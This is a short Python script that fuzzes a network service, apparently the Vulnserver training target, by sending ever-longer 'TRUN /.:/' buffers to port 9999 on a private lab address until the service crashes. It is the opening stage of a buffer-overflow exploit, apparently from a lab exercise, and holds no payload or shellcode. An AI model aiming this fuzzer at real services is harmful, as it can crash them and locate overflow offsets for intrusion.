#!/usr/bin/python3

import sys
import socket
import signal
from time import sleep

buffer = b"A" * 100
ip = '192.168.253.136'
port = 9999

def signal_handler(sig, frame):
    print(f"Fuzzing stopped at {len(buffer)} bytes")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            s.send(b'TRUN /.:/' + buffer)

        sleep(1)
        buffer += b"A" * 100
    except Exception as e:
        print(f"Fuzzing crashed at {len(buffer)} bytes")
        sys.exit()

